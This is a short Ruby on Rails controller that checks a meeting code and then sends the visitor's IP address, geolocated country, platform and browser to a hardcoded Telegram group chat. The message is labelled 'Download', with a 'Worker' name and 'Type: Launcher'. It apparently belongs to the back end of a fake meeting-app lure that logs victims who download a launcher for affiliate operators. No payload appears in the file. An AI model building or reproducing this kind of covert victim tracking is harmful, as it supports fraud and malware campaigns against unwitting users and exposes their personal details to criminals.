class TelegramMessagesController < ApplicationController
  def create
    meeting = Meeting.find_by(code: params[:value].downcase)

    if meeting.nil?
      return render json: { error: 'Your meeting not found!', success: false }
    end

    if request.remote_ip == "::1"
      ip = '127.0.0.1'
      country = 'unknown'
    else
      ip = request.remote_ip
      country = Geocoder.search(request.remote_ip)&.country || 'unknown'
    end

    text = " #define\n⚠️ Download ⚠️\n🔗 IP: #{ip}\n🌎 Country: #{country}\n👨🏻‍💻 Worker: #{meeting.name} #{meeting.code.upcase}\n📑 Type: Launcher\n💻 Platform: #{params['platform']}\n🌐 Browser: #{params['browser']}"
    @bot.api.send_message(chat_id: -4260423828, text:)
  end
end
